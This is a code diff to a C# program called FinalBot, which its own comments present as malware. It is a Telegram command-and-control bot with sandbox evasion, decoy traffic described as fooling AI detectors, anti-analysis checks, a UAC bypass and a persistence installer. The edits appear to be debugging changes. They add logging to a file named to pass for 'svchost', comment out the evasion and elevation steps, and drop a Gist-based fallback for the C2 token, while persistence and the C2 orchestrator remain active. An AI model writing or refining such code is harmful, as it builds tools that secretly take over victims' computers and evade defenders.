@@ -12,16 +12,26 @@ namespace FinalBot
     {
         private static Mutex? _mutex;
 
+        private static void DebugLog(string msg)
+        {
+            try { File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
+        }
+
         static async Task Main(string[] args)
         {
-            // 1. Single Instance Check — random GUID mutex (no static signature)
+            DebugLog("=== PROGRAM START ===");
+            
+            // 1. Single Instance Check — fixed name to prevent multi-launch conflicts
             bool createdNew;
-            string mutexName = $"Global\\MS_{Guid.NewGuid():N}";
+            string mutexName = "Global\\MS_Vanguard_System_Primary";
             _mutex = new Mutex(true, mutexName, out createdNew);
-            if (!createdNew) return;
+            if (!createdNew) 
+            {
+                DebugLog("Process already running (Mutex found). Exiting.");
+                return;
+            }
 
-            // 2. Sandbox Evasion — random sleep before any suspicious activity
-            await Task.Delay(new Random().Next(3000, 15000));
+            DebugLog("Mutex acquired. Initializing services...");
 
             // 3. Decoy Traffic — looks like normal browsing to AI detectors
             _ = Task.Run(async () =>
@@ -44,14 +54,16 @@ namespace FinalBot
             });
 
             // 2. Anti-Analysis Check
-            if (SafetyManager.VerifySystemContext()) return;
+            // if (SafetyManager.VerifySystemContext()) return;
 
             // 3. UAC Check & Bypass
+            /*
             if (!ElevationService.IsAdmin())
             {
                 ElevationService.RequestElevation(Process.GetCurrentProcess().MainModule?.FileName ?? "FinalBot.exe");
                 return; 
             }
+            */
 
             // 4. Persistence
             Persistence.Install();
@@ -59,34 +71,29 @@ namespace FinalBot
             // 5. Start Orchestrator
             try 
             {
+                DebugLog("Loading ConfigManager...");
                 ConfigManager.Load();
                 
                 string token = ConfigManager.Get("BOT_TOKEN");
                 string adminId = ConfigManager.Get("ADMIN_ID");
                 
-                if (string.IsNullOrEmpty(token) || token == "YOUR_TELEGRAM_BOT_TOKEN")
+                DebugLog($"Token length: {token?.Length ?? 0}, AdminID: {adminId}");
+
+                if (string.IsNullOrEmpty(token) || token.Length < 10)
                 {
-                    Logger.Warn("[C2] Primary token missing or invalid. Attempting Gist fallback...");
-                    var fallback = await GistService.GetFallbackConfigAsync();
-                    if (fallback.HasValue)
-                    {
-                        token = fallback.Value.Token;
-                        adminId = fallback.Value.ChatId;
-                        ConfigManager.Set("BOT_TOKEN", token);
-                        ConfigManager.Set("ADMIN_ID", adminId);
-                    }
-                    else
-                    {
-                        Logger.Error("[C2] FATAL: Cannot start bot, no token available.");
-                        return;
-                    }
+                    DebugLog("Token invalid. Application cannot proceed.");
+                    return;
                 }
 
+                DebugLog("Creating BotOrchestrator...");
                 var orchestrator = new BotOrchestrator(token, adminId);
+                
+                DebugLog("Starting BotOrchestrator...");
                 await orchestrator.StartAsync();
             }
             catch (Exception ex)
             {
+                DebugLog($"FATAL ERROR: {ex.Message}\n{ex.StackTrace}");
                 Logger.Error("Fatal application error", ex);
                 LogCrash(ex);
             }
